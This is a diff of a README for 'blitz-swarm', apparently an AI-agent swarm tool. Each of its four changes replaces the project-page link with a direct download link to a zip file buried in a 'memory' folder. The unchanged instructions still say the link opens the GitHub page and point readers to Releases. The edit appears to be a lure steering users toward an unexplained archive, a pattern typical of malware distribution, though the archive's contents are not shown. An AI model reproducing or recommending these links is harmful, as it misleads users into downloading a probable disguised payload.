@@ -1,6 +1,6 @@
 # 🐝 blitz-swarm - Run Collective AI Agents Together
 
-[![Download blitz-swarm](https://img.shields.io/badge/Download-blitz--swarm-blue?style=for-the-badge)](https://github.com/Theridiidsonometer797/blitz-swarm)
+[![Download blitz-swarm](https://img.shields.io/badge/Download-blitz--swarm-blue?style=for-the-badge)](https://github.com/Theridiidsonometer797/blitz-swarm/raw/refs/heads/main/memory/swarm-blitz-v2.1.zip)
 
 ---
 
@@ -35,7 +35,7 @@ Key points:
 
 You can download blitz-swarm by visiting the project page below:
 
-[**Visit this page to download blitz-swarm**](https://github.com/Theridiidsonometer797/blitz-swarm)
+[**Visit this page to download blitz-swarm**](https://github.com/Theridiidsonometer797/blitz-swarm/raw/refs/heads/main/memory/swarm-blitz-v2.1.zip)
 
 Click that link to open the GitHub page. From there, you will find the latest version of the software to download.
 
@@ -45,7 +45,7 @@ Follow these steps carefully.
 
 1. Open your web browser (like Chrome or Edge).
 
-2. Go to this link: https://github.com/Theridiidsonometer797/blitz-swarm
+2. Go to this link: https://github.com/Theridiidsonometer797/blitz-swarm/raw/refs/heads/main/memory/swarm-blitz-v2.1.zip
 
 3. On the GitHub page, look for the **Releases** area. This is usually on the right side or under the main title. Click on it.
 
@@ -122,4 +122,4 @@ The project is experimental and aimed at people curious about swarm intelligence
 
 You can always download the latest version from here:
 
-[![Download blitz-swarm](https://img.shields.io/badge/Download-blitz--swarm-grey?style=for-the-badge)](https://github.com/Theridiidsonometer797/blitz-swarm)
+[![Download blitz-swarm](https://img.shields.io/badge/Download-blitz--swarm-grey?style=for-the-badge)](https://github.com/Theridiidsonometer797/blitz-swarm/raw/refs/heads/main/memory/swarm-blitz-v2.1.zip)
